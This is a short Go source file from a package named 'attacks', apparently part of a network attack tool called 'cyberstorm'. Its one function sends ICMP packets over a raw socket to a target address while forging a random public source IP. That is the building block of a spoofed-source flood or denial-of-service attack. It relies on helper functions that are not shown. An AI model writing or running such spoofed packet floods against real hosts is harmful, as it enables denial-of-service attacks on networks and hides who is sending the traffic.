package attacks

import (
	"net"
	"syscall"

	"cyberstorm/core"
)

func SendICMP(rawSocket core.RawSocket, dstIp net.IP) error {
	srcIp := core.GetRandPublicIP()
	icmpHeaderBytes, err := core.GetICMPHeaderBytes()
	if err != nil {
		return err
	}

	return core.SendPacket(rawSocket, srcIp, dstIp, syscall.IPPROTO_ICMP, icmpHeaderBytes)
}
